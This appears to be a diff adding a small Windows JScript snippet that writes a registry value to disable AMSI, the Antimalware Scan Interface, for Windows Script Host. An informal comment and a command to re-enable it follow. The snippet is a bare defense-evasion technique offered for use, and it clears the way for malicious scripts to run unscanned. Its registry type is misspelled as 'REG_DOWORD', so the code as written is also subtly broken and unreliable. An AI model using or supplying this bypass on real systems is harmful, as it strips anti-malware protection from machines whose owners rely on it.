@@ -1,0 +1,6 @@
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+sh.RegWrite(key, 0, "REG_DOWORD");
+
+"if u want to re-enable amsi run this command in cmd"
+reg add "HKCU\Software\Microsoft\Windows Script\Settings" /t REG_DWORD /v AmsiEnable /d 1 /f
